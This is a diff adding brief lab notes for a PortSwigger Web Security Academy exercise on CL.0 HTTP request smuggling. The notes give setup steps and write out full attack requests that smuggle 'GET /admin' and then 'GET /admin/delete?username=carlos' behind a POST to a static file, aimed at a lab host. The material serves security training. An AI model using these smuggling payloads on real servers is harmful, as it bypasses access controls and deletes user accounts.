@@ -1,0 +1,50 @@
+Lab: CL.0 request smuggling
+Front-end: CL
+Backend: 0 (Ignoring the Content-Length)
+
+(1) Find endpoint that Ignoring Content-Length
+(2) Using POST request to the static file.
+(3) Header -> Connection: Keep-Alive
+(4) Enable HTTP/1 coonection Re-Use
+(5) Send group - Single Connection
+
+(6) 
+Attack Request:
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a9500c6046f0fe081ef7f0000f3007d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Connection: Keep-Alive
+
+GET /admin HTTP/1.1
+X-Ignore: x
+--------------
+Normal Request:
+GET / HTTP/1.1
+Host: 0a9500c6046f0fe081ef7f0000f3007d.web-security-academy.net
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Referer: https://portswigger.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+----------------------> Send both request over single TCP connection
+(7)
+Attack Request:
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a9500c6046f0fe081ef7f0000f3007d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Connection: Keep-Alive
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-Ignore: x
+-----------------------
